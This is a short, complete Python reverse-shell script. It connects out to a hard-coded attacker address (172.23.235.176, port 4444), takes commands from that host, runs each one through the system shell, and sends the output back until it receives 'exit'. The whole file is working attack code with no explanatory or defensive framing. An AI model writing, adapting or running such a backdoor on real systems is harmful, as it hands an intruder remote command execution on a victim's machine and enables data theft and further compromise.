import socket
import subprocess

ATTACKER_IP = '172.23.235.176'
ATTACKER_PORT = 4444
BUFFER_SIZE = 1024

# create socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ATTACKER_IP, ATTACKER_PORT))

# listen for commands and run
while True:
    command = client.recv(BUFFER_SIZE).decode()

    if command.lower() == 'exit':
        client.close()
        break

    # execute and send result back
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    client.send(result.stdout.encode() + result.stderr.encode())
